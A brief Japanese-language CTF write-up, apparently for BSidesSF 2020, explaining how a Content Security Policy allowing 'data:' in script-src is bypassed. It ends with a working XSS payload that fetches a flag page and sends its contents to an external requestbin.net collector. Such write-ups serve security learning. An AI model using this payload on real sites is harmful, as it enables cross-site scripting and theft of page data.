
'''

# 前提知識

- CSP Bypass

# 解説

CSPの設定を見る。

```
content-security-policy: 
    script-src 'self' data:; 
    default-src 'self'; 
    connect-src *; 
    report-uri /csp_report
```

script-srcのdata:は許可している。  
それで与えれば許可される。

[Data URI scheme - Wikipedia](https://ja.wikipedia.org/wiki/Data_URI_scheme)  
data:はこれ見とけば大丈夫。  
参考にした。[BSidesSF 2020 CTF](https://blog.rwx.kr/BSidesSF-2020-CTF/#51pts-csp-1)

```html
<script src="data:text/javascript,fetch('/csp-one-flag').then(x=>x.text()).then(x=>location='http://requestbin.net/r/1ax2j8w1?q='+escape(x))">
```

'''